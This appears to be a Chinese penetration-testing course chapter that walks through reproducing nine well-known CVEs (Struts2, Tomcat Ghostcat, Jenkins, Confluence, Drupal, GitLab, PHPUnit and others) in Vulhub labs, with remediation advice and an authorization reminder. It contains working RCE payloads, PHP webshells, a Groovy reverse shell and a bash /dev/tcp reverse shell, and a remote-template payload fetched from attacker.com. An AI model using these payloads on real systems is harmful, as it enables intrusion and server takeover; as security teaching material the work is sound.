# Vulhub 高频漏洞实战 · A 级（高频实战 9 个）
## 总览
| #   | 漏洞                      | CVE                             | 类型              |
| --- | ----------------------- | ------------------------------- | --------------- |
| 1   | Struts2 S2-057 / S2-061 | CVE-2018-11776 / CVE-2020-17530 | OGNL 注入         |
| 2   | Tomcat Ghostcat         | CVE-2020-1938                   | AJP 文件包含        |
| 3   | Apache HTTPD 换行解析       | CVE-2017-15715                  | 解析漏洞            |
| 4   | Nginx 解析漏洞 + 路径穿越       | 配置类                             | 解析漏洞            |
| 5   | Jenkins RCE             | CVE-2018-1000861                | Groovy + 反序列化   |
| 6   | Confluence SSTI         | CVE-2019-3396                   | Freemarker SSTI |
| 7   | Drupal Drupalgeddon2    | CVE-2018-7600                   | 框架 RCE          |
| 8   | GitLab ExifTool RCE     | CVE-2021-22205                  | 文件上传 + 命令注入     |
| 9   | phpunit eval-stdin RCE  | CVE-2017-9841                   | 后门式 RCE         |


---

# 第 1 关 Struts2 S2-057 / S2-061
## 1.1 产品介绍
**Apache Struts2** 是 Java Web 老牌 MVC 框架，2010 年代国内大量政企、银行、运营商系统使用，至今存量巨大。

+ 基于拦截器（Interceptor）架构
+ OGNL 表达式贯穿整个框架（用于值栈、参数绑定、视图渲染）

## 1.2 漏洞背景
Struts2 因为 OGNL 表达式被滥用，历史上几乎每隔半年爆一次 RCE，业内俗称"S2-001 到 S2-062"。

+ **S2-057（CVE-2018-11776）**：namespace 参数 OGNL 注入。当 XML 配置中 namespace 是通配符或空时，URL 路径中的 namespace 被作为 OGNL 表达式解析。
+ **S2-061（CVE-2020-17530）**：标签属性 OGNL 注入。绕过 S2-059 的修复，标签属性 `%{...}` 再次可注入。

OGNL 表达式注入本质和 SSTI/SpEL 是同一个家族。

## 1.3 利用条件与版本
| CVE | 影响版本 |
| --- | --- |
| S2-057 | Struts 2.0.4 - 2.5.16 |
| S2-061 | Struts 2.0.0 - 2.5.25 |


**利用条件**：
+ 应用使用受影响 Struts2 版本
+ S2-057 需要 namespace 配置为通配或空
+ S2-061 默认配置可触发

## 1.4 复现过程
### 1.4.1 启动环境
```bash
cd vulhub/struts2/s2-057
docker-compose up -d
```

### 1.4.2 S2-057 Payload
```bash
curl "http://localhost:8080/%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D/actionName.action"
```

URL 解码后核心是 OGNL 表达式：
```plain
${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
(#ct=#request['struts.valueStack'].context).
(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).
(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
(#ou.getExcludedPackageNames().clear()).
(#ou.getExcludedClasses().clear()).
(#ct.setMemberAccess(#dm)).
(#a=@java.lang.Runtime@getRuntime().exec('id')).
(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
```

响应会包含 `uid=...` 输出。

### 1.4.3 S2-061 Payload
```bash
curl -X POST http://target:8080/action.action \
  -H "Content-Type: multipart/form-data" \
  --data $'%{(@java.lang.Runtime@getRuntime().exec("id"))}'
```

或者用现成工具：

```bash
git clone https://github.com/HXSecurity/Struts2-Scan
python struts2-scan.py -u http://target:8080/
```

### 1.4.4 一键扫描工具
`Struts2-Scan` 整合 S2-001 到 S2-061 所有漏洞检测：

```bash
python struts2-scan.py -u http://target/
```

## 1.5 修复建议
1. **升级 Struts2 到 2.5.26+ 或迁移到 6.x**
2. 关闭 OGNL 表达式（开发模式）
3. WAF 规则：拦截 `%{`、`${`、`@java.lang.Runtime@` 等 OGNL 特征
4. 老系统建议逐步迁移到 Spring Boot

---

# 第 2 关 Tomcat Ghostcat 幽灵猫（CVE-2020-1938）
## 2.1 产品介绍
**Apache Tomcat** 是最流行的 Java Servlet 容器，承载了互联网大约 30% 的 Java Web 应用。

+ 默认端口 8080（HTTP）、8009（AJP）、8005（Shutdown）
+ AJP（Apache JServ Protocol）是 Tomcat 私有二进制协议，用于反向代理加速

## 2.2 漏洞背景
2020 年 2 月披露，影响所有 Tomcat 版本。漏洞根因：

+ AJP 协议默认无认证
+ AJP 请求的 `javax.servlet.include.request_uri` 等 4 个属性被服务端信任
+ 攻击者通过 AJP 端口发送特制请求 → 让 Tomcat 读取任意 webapps 下的文件 → 文件包含（JSP 解析）→ RCE

由于 AJP 端口 8009 在很多部署中对外暴露（误配置），漏洞被业内称为"幽灵猫"。

## 2.3 利用条件与版本
| CVE | 影响版本 |
| --- | --- |
| CVE-2020-1938 | Tomcat 6.x / 7.0.0-7.0.99 / 8.5.0-8.5.50 / 9.0.0-9.0.30 |


**利用条件**：

+ AJP 端口（8009）可达
+ 文件读取默认可读 webapps 下任意 txt/jsp/html
+ 文件上传 + 包含 = RCE（需要先能上传文件）

## 2.4 复现过程
### 2.4.1 启动环境
```bash
cd vulhub/tomcat/CVE-2020-1938
docker-compose up -d
# 8080 HTTP、8009 AJP
```

### 2.4.2 文件读取 PoC
```bash
git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
cd CNVD-2020-10487-Tomcat-Ajp-lfi
python ajpShark.py http://target:8080 -f /WEB-INF/web.xml
```

或用更通用的 Ghostcat 工具：

```bash
git clone https://github.com/00theway/Ghostcat
python ghostcat.py -p 8009 target /WEB-INF/web.xml
```

返回 web.xml 内容（含 Servlet 配置、敏感信息）。

### 2.4.3 RCE 路径（任意文件上传 + 包含）
1. 通过其他接口上传 `shell.txt`（内容是 JSP 木马）
2. 用 Ghostcat 把 `shell.txt` 当 JSP 解析执行

```bash
python ghostcat.py -p 8009 target /shell.txt
# 服务端把 shell.txt 当 JSP 执行
```

### 2.4.4 Nmap 检测
```bash
nmap -p 8009 --script ajp-request target
```

## 2.5 修复建议
1. **升级到 9.0.31 / 8.5.51 / 7.0.100+**
2. 临时缓解：
    - 关闭 AJP：`server.xml` 注释 `<Connector port="8009".../>`
    - AJP 配置认证：`secret` 参数
3. 网络隔离：AJP 仅内网，不对公网暴露
4. 删除 webapps 下默认示例（docs/examples/manager）

---

# 第 3 关 Apache HTTPD 换行解析漏洞（CVE-2017-15715）
## 3.1 产品介绍
**Apache HTTP Server（httpd）** 是世界使用量第一的 Web 服务器，与 PHP / Tomcat / Nginx 配合使用。

## 3.2 漏洞背景
2017 年披露。漏洞根因：

+ 配置 `FilesMatch \.ph(p[345]?|t|tml)$` 用来识别 PHP 文件
+ Apache 使用 `$` 正则匹配，但默认未启用 MULTILINE 模式
+ 文件名末尾加换行符 `\n`（`shell.php\n`）能绕过 `$` 匹配
+ Apache 仍然把该文件当 PHP 解析

利用场景：上传 `shell.php%0a`，文件名末尾带换行符，绕过黑名单 `.php$`。

## 3.3 利用条件与版本
| CVE | 影响版本 |
| --- | --- |
| CVE-2017-15715 | Apache 2.4.0 - 2.4.29 |


**利用条件**：

+ 服务端是 Apache 2.4.x（受影响版本）
+ 上传后文件名保留（不被改名、不被去除换行符）
+ 黑名单过滤 `.php` 结尾

## 3.4 复现过程
### 3.4.1 启动环境
```bash
cd vulhub/httpd/CVE-2017-15715
docker-compose up -d
```

### 3.4.2 普通上传
页面提供一个上传表单，黑名单禁 `.php` 后缀。

```bash
curl -F "file=@shell.php" http://target/
# 返回：禁止上传 php 文件
```

### 3.4.3 绕过 Payload
构造文件名末尾带 `\n`：

```bash
# shell.php\x0a 内容：<?php @eval($_POST['c']);?>
printf '<?php @eval($_POST[1]);?>\n' > shell.php
# Burp 抓包把文件名改成 shell.php%0a 或者文件名末尾加空字节后换行
```

Burp 拦截上传请求：

```plain
Content-Disposition: form-data; name="file"; filename="shell.php"
                                       ↓
Content-Disposition: form-data; name="file"; filename="shell.php
"
```

即在 `shell.php` 后插入 `\n` 换行符。

### 3.4.4 验证
服务端保存为 `shell.php\n`，访问 `http://target/upload/shell.php%0a`，PHP 解析执行，webshell 落地。

## 3.5 修复建议
1. **升级到 2.4.30+**
2. 修改正则匹配：把 `$` 改成 `\Z` 或显式添加 MULTILINE 模式
3. 文件名重命名（随机字符串 + 白名单后缀）
4. 上传目录禁止执行（`php_flag engine off`）
5. 升级 PHP（部分 PHP 版本对换行后缀也做了限制）

---

# 第 4 关 Nginx 解析漏洞 + 路径穿越
## 4.1 产品介绍
**Nginx** 是高性能 Web 服务器/反向代理，常用于搭配 PHP-FPM 运行 PHP 应用。

## 4.2 漏洞背景
Nginx 常见两类"逻辑配置漏洞"：

### 4.2.1 PHP-FPM 解析漏洞（cgi.fix_pathinfo）
URL `/test.png/x.php` 被 Nginx 转发到 PHP-FPM 时：

+ PHP 看 `x.php` 不存在，因为 `cgi.fix_pathinfo=1`，会"回退"找 `/test.png`
+ 把 `test.png` 当 PHP 解析
+ 如果 test.png 内嵌了 PHP 代码，就执行

### 4.2.2 别名配置路径穿越
```nginx
location /i {
    alias /usr/share/nginx/images/;
}
```

访问 `/i../etc/passwd` 会拼成 `/usr/share/nginx/images../etc/passwd` → 路径穿越到 `/usr/share/nginx/etc/passwd`。

## 4.3 利用条件
+ Nginx + PHP-FPM 部署
+ `cgi.fix_pathinfo=1`（旧 PHP 默认）
+ 别名 `alias` 目录配置 + 末尾无斜杠

## 4.4 复现过程
### 4.4.1 启动环境
```bash
cd vulhub/nginx/insecure-configuration
docker-compose up -d
```

### 4.4.2 PHP 解析漏洞
1. 上传一张内嵌 PHP 代码的图片（图片马）：
```bash
# 图片马制作
cat normal.jpg shell.php > shell.jpg
# shell.jpg 在二进制上还是图片，但末尾有 PHP 代码
```

2. 访问：
```bash
curl http://target/upload/shell.jpg/x.php
# Nginx 把请求转给 PHP-FPM
# PHP-FPM 看 x.php 不存在，fix_pathinfo 回退到 shell.jpg，当 PHP 解析
# 执行 shell.php 中的 PHP 代码
```

### 4.4.3 路径穿越
```bash
curl http://target/i../etc/passwd
# 返回 /etc/passwd 内容
```

### 4.4.4 Nginx 配置错误全检测
参考 [https://github.com/yandex/gixy](https://github.com/yandex/gixy) （Nginx 配置静态分析工具）：

```bash
pip install gixy
gixy /etc/nginx/nginx.conf
```

## 4.5 修复建议
1. **修改**`php.ini`：`cgi.fix_pathinfo=0`
2. **Nginx 配置显式区分 PHP**：

```nginx
location ~ \.php$ {
    fastcgi_pass php:9000;
    ...
}
location ~* \.(jpg|png|gif)$ {
    # 图片不转 PHP
}
```

3. **alias 目录加斜杠**：`location /i/ { alias /usr/share/nginx/images/; }`
4. **上传目录禁止执行 PHP**：`location ^~ /upload/ { deny all; }`
5. 用 gixy 定期审计配置

---

# 第 5 关 Jenkins RCE（CVE-2018-1000861）
## 5.1 产品介绍
**Jenkins** 是最流行的开源 CI/CD 工具，用于自动化构建、测试、部署。

+ 提供插件生态、Web 界面、Pipeline 脚本
+ 默认端口 8080
+ 内网渗透中常作为"跳板"系统

## 5.2 漏洞背景
Jenkins 历史 RCE 漏洞众多，本课件选两个典型：

+ **CVE-2018-1000861**：Stapler 框架反序列化 + Hessian 反序列化
+ **未授权脚本控制台**：管理员忘记关闭 `/script` 接口，可执行 Groovy 代码

Groovy 控制台是 Jenkins 最常见 RCE 入口：

```plain
http://target:8080/script
```

输入：
```groovy
def cmd = "id".execute()
println cmd.text
```

直接 RCE。

## 5.3 利用条件
| 场景 | 条件 |
| --- | --- |
| CVE-2018-1000861 | Jenkins ≤ 2.153 / LTS ≤ 2.138.1 |
| 未授权 Script Console | 未登录可访问 `/script`（运维疏忽） |
| CVE-2024-23897（补充） | 任意文件读取，Jenkins ≤ 2.442 |


## 5.4 复现过程
### 5.4.1 启动环境
```bash
cd vulhub/jenkins/CVE-2018-1000861
docker-compose up -d
```

### 5.4.2 指纹识别
```bash
curl -I http://target:8080/
# X-Jenkins header 暴露版本
```

### 5.4.3 CVE-2018-1000861 利用
```bash
git clone https://github.com/vulhub/CVE-2018-1000861
python exploit.py http://target:8080/
```

或直接用工具：
```bash
git clone https://github.com/gquere/persistence_monitoring
# 或 JenkinsExploit-GUI
```

### 5.4.4 Script Console（如果可未授权访问）
```bash
curl -X POST http://target:8080/script \
  -d 'script=println "id".execute().text'
```

Groovy 一键反弹 shell：
```groovy
String host="10.0.0.1";
int port=4444;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
new Thread(new Runnable() {
    public void run() {
        byte[] buffer = new byte[1024];
        try {
            int bytes;
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (pi != null || pe != null || si != null) {
                // ...省略具体实现
            }
        } catch (IOException e) {}
    }
}).start();
p.waitFor();
```

### 5.4.5 CVE-2024-23897（补充）
最新漏洞，任意文件读取：

```bash
jenkins-cli.jar -http http://target/ help 1 '@/etc/passwd'
```

利用 CLI 解析 `@filename` 参数的特性读取任意文件。

## 5.5 修复建议
1. **升级 Jenkins 到最新 LTS**
2. 启用"基于角色的授权策略"（Role-Based Strategy）
3. 关闭注册、强制登录
4. Script Console 仅限管理员，启用 CSRF 保护
5. 网络隔离：Jenkins 仅内网访问
6. 定期审计插件、移除不必要插件

---

# 第 6 关 Confluence SSTI（CVE-2019-3396）
## 6.1 产品介绍
**Atlassian Confluence** 是企业级 Wiki / 协作平台，常用于团队知识库、文档管理。
+ 默认端口 8090
+ 用 Java + Freemarker 模板引擎

## 6.2 漏洞背景
2019 年 3 月披露。漏洞根因：
+ 富文本编辑器 widget connector 接受 `_template` 参数
+ `_template` 指定渲染模板路径，未做严格限制
+ 攻击者指定任意路径（包括 webapps 目录、远程模板）作为模板
+ 触发 Freemarker SSTI → RCE

## 6.3 利用条件与版本
| 版本 | 漏洞 |
| --- | --- |
| 6.6.0 - 6.6.12 | 可利用 |
| 6.7.0 - 6.12.2 | 可利用 |
| 6.13.0+ / 6.6.13+ | 已修复 |

**利用条件**：
+ 无需认证（具体 payload 视版本）

## 6.4 复现过程
### 6.4.1 启动环境
```bash
cd vulhub/confluence/CVE-2019-3396
docker-compose up -d
# 启动较慢
```

### 6.4.2 文件读取 Payload
```bash
curl -X POST "http://target:8090/rest/tinymce/1/macro/preview" \
  -H "Content-Type: application/json" \
  -d '{
    "contentId": "1",
    "macro": {
      "name": "widget",
      "body": "",
      "params": {
        "url": "https://www.viddler.com/v/123",
        "_template": "file:///etc/passwd"
      }
    }
  }'
```

响应中包含 `/etc/passwd` 内容。

### 6.4.3 RCE Payload
把 `_template` 指向远程恶意 Freemarker 模板：

```bash
# 攻击者服务器放 evil.ftl，内容：
[#assign cmd="id"]
[#assign exec=cmd?eval]
${exec}
```

或直接传 inline 模板：

```bash
curl -X POST "http://target:8090/rest/tinymce/1/macro/preview" \
  -H "Content-Type: application/json" \
  -d '{
    "contentId": "1",
    "macro": {
      "name": "widget",
      "body": "",
      "params": {
        "url": "https://www.viddler.com/v/123",
        "_template": "https://attacker.com/evil.ftl"
      }
    }
  }'
```

evil.ftl 中的 Freemarker 表达式被执行。

### 6.4.4 命令执行 Payload
evil.ftl 内容：

```plain
[#assign exec="freemarker.template.utility.Execute"?new()]${exec("id")}
```

## 6.5 修复建议
1. **升级到 6.13.0 / 6.6.13+**
2. WAF 规则：拦截 `/rest/tinymce/1/macro/preview` 中的 `_template` 参数
3. Confluence 限制外网访问（避免拉取远程模板）
4. 启用管理员认证，限制匿名访问

---

# 第 7 关 Drupal Drupalgeddon2（CVE-2018-7600）
## 7.1 产品介绍
**Drupal** 是世界三大开源 CMS 之一（与 WordPress、Joomla 并列），国外政府、大学、企业大量使用。
+ 用 PHP 写，模块化
+ 默认端口 80

## 7.2 漏洞背景
2018 年 4 月披露，业内称"Drupalgeddon2"。漏洞根因：

+ Drupal Form API 对嵌套数组参数处理不严
+ 用户可控的 `#` 开头的 key（如 `#lazy_builder`、`#pre_render`）被当作回调函数调用
+ 攻击者通过这些 key 触发任意函数调用

后续 CVE-2018-7602、CVE-2019-6340 等系列漏洞延续。

## 7.3 利用条件与版本
| 版本 | 漏洞 |
| --- | --- |
| Drupal 7.x < 7.58 | 可利用 |
| Drupal 8.5.x < 8.5.1 | 可利用 |
| Drupal 8.4.x < 8.4.6 | 可利用 |


**利用条件**：
+ 无需认证
+ 默认安装即可触发

## 7.4 复现过程
### 7.4.1 启动环境
```bash
cd vulhub/drupal/CVE-2018-7600
docker-compose up -d
```

### 7.4.2 一键 PoC
```bash
git clone https://github.com/dreadlocked/Drupalgeddon2
cd Drupalgeddon2
pip install bs4 requests
python drupalgeddon2.py http://target/
```

### 7.4.3 手工 Payload（Drupal 8.x）
```bash
curl -X POST "http://target/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id'
```

返回 `uid=...`。

### 7.4.4 反弹 Shell
把 `id` 换成 base64 编码的反弹 shell。

## 7.5 修复建议
1. **升级到 7.58 / 8.5.1+**
2. 启用 WAF，拦截 `element_parents` 和 `#` 开头的参数 key
3. 关闭用户注册（不必要时）
4. 限制 PHP 函数（`disable_functions`）

---

# 第 8 关 GitLab ExifTool RCE（CVE-2021-22205）
## 8.1 产品介绍
**GitLab** 是 DevOps 一体化平台，集成 Git 仓库、CI/CD、Issue、Wiki。

+ 默认端口 80 / 443 / 22
+ 大量企业内部部署社区版

## 8.2 漏洞背景
2021 年 4 月披露。漏洞根因：

+ GitLab 使用 ExifTool 解析上传图片的 EXIF 元数据
+ ExifTool 在解析 DJVU 文件格式时存在命令注入（CVE-2020-0298）
+ 攻击者上传构造的恶意图片，触发 ExifTool 执行任意命令
+ **无需认证**

由于无需登录、影响社区版和企业版，被业内称为"GitLab 半年后最大漏洞"。

## 8.3 利用条件与版本
| 版本 | 漏洞 |
| --- | --- |
| 11.9 - 13.8.8 | 可利用 |
| 13.9.0 - 13.9.6 | 可利用 |
| 13.10 - 13.10.3 | 可利用 |
| 13.9.7+ / 13.10.4+ | 已修复 |


**利用条件**：

+ 无需认证
+ 默认配置可触发

## 8.4 复现过程
### 8.4.1 启动环境
```bash
cd vulhub/gitlab/CVE-2021-22205
docker-compose up -d
# 启动较慢（3-5 分钟）
```

### 8.4.2 准备恶意图片
```bash
git clone https://github.com/CsEnox/CVE-2021-22205.git
cd CVE-2021-22205
python3 gen_malware.py
# 生成恶意 djvu 图片
```

或手工构造：
```python
# 构造 DJVU 文件，把 metadata 字段嵌入 perl 命令
# payload 内容：
# (metadata
#     (CVE-2021-22205 "1' \"\nsystem('touch /tmp/pwned')\n\"")
# )
```

### 8.4.3 上传触发
```bash
curl -X POST "http://target/uploads/user" \
  -F "file=@evil.jpg"
```

服务端 ExifTool 解析 → 触发 perl `system()` 调用 → 命令执行。

### 8.4.4 一键利用工具
```bash
git clone https://github.com/Al1ex/CVE-2021-22205
python CVE-2021-22205.py -t http://target/ -c "bash -c ..."
```

## 8.5 修复建议
1. **升级到 13.10.3+ / 13.9.7+ / 13.8.8+**
2. 临时缓解：禁用图片处理（`/etc/gitlab/gitlab.rb` 中关闭）
3. WAF 规则：检测上传的 DJVU/异常图片格式
4. 限制注册（关闭公开注册）
5. 出网管控：禁止主动外联

---

# 第 9 关 phpunit eval-stdin.php RCE（CVE-2017-9841）
## 9.1 产品介绍
**PHPUnit** 是 PHP 生态最流行的单元测试框架，几乎所有 PHP 项目（包括 Laravel、Symfony、WordPress 等）都用它写测试代码。

## 9.2 漏洞背景
2017 年披露。漏洞根因：
+ PHPUnit 在 `phpunit/src/Util/PHP/eval-stdin.php` 中存在 `eval()` 调用
+ 该文件根据 HTTP 请求 body 直接 eval 执行
+ 当 vendor 目录被部署到 web 可访问目录（即用户能直接访问 `vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`）时，攻击者可远程执行任意 PHP 代码

虽然这个漏洞看起来"很简单"，但**互联网上仍有大量未修复目标**，原因是：
+ PHPUnit 通过 Composer 安装，vendor 目录常被开发者误暴露
+ 老项目长期不升级

## 9.3 利用条件与版本
| 版本                      | 漏洞  |
| ----------------------- | --- |
| PHPUnit 4.8.19 - 4.8.27 | 可利用 |
| PHPUnit 5.0.10 - 5.6.2  | 可利用 |
| PHPUnit 6.0.0 - 6.0.4   | 可利用 |
| 后续版本                    | 已修复 |


**利用条件**：
+ vendor 目录可被 Web 访问
+ 漏洞文件存在于上述路径

## 9.4 复现过程
### 9.4.1 启动环境
```bash
cd vulhub/phpunit/CVE-2017-9841
docker-compose up -d
```

### 9.4.2 漏洞检测
```bash
curl http://target/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
```

如果文件存在，会等待 POST body 然后 eval。

### 9.4.3 RCE Payload
```bash
curl -X POST http://target/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php \
  -d '<?php echo system("id");?>'
```

返回 `uid=33(www-data) gid=33(www-data)`。

### 9.4.4 反弹 Shell
```bash
curl -X POST http://target/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php \
  -d '<?php system("bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"");?>'
```

## 9.5 修复建议
1. **升级 PHPUnit 到 4.8.28 / 5.6.3 / 6.0.5+**
2. **Nginx/Apache 配置禁止访问 vendor 目录**：

```nginx
location ^~ /vendor/ {
    deny all;
    return 403;
}
```

3. Composer 部署时排除 vendor 目录到 web 根
4. 升级 Composer 依赖（`composer update`）
5. 用静态代码扫描工具（如 Phan、PHPStan）检测敏感函数

---

## 总结表
| 漏洞 | 出现频率 | 利用难度 | 危害 | 关键指纹 |
| --- | --- | --- | --- | --- |
| Struts2 S2-057/061 | ★★★★★ | 中 | RCE | `.action`、`.do` 后缀 |
| Tomcat Ghostcat | ★★★ | 中 | 文件读取 / RCE | 端口 8009 开放 |
| Apache 换行解析 | ★★★ | 易 | Webshell | Apache 2.4.0-2.4.29 |
| Nginx 解析 | ★★★★ | 易 | Webshell | fix_pathinfo=1 |
| Jenkins RCE | ★★★★ | 易 | RCE | 端口 8080、X-Jenkins |
| Confluence SSTI | ★★★ | 中 | RCE | 端口 8090、/rest/tinymce |
| Drupal Drupalgeddon2 | ★★★ | 中 | RCE | 国外站点 |
| GitLab ExifTool | ★★★ | 中 | RCE | 公开注册 |
| phpunit eval | ★★★★ | 极易 | RCE | vendor 路径 |


## 课后作业
1. 按 9 个漏洞顺序复现，提交每个的：
    - 指纹识别（Nmap / curl）
    - 完整 PoC
    - 修复验证
2. 用 Nuclei 模板批量扫描上述漏洞：参考 [https://github.com/projectdiscovery/nuclei-templates](https://github.com/projectdiscovery/nuclei-templates)
3. 编写一份《企业内 Java/PHP 中间件漏洞检测 checklist》
4. 阅读 S2-061 的 OGNL payload，理解 OGNL 表达式语法
5. 学习用 Struts2-Scan、Nuclei、xray 等工具做批量扫描

## 法律与授权提醒
```plain
┌──────────────────────────────────────────────────────────┐
│ 1. 所有复现必须在本地 Vulhub 或授权环境                  │
│ 2. 实战中遇到这些漏洞先报告厂商，不要进一步渗透          │
│ 3. 利用 Jenkins / GitLab 等内部系统，需获得书面授权      │
│ 4. CVE-2017-9841 这种"工具漏洞"在未授权场景同样违法      │
│ 5. 反弹 shell、内网横向、持久化等后续操作均需单独授权    │
└──────────────────────────────────────────────────────────┘
```

---

## 下一课件预告
下一章 **《Vulhub 高频漏洞 B 级实战》**，包括 3 个未授权/中间件类漏洞：ElasticSearch、ZooKeeper、phpMyAdmin。
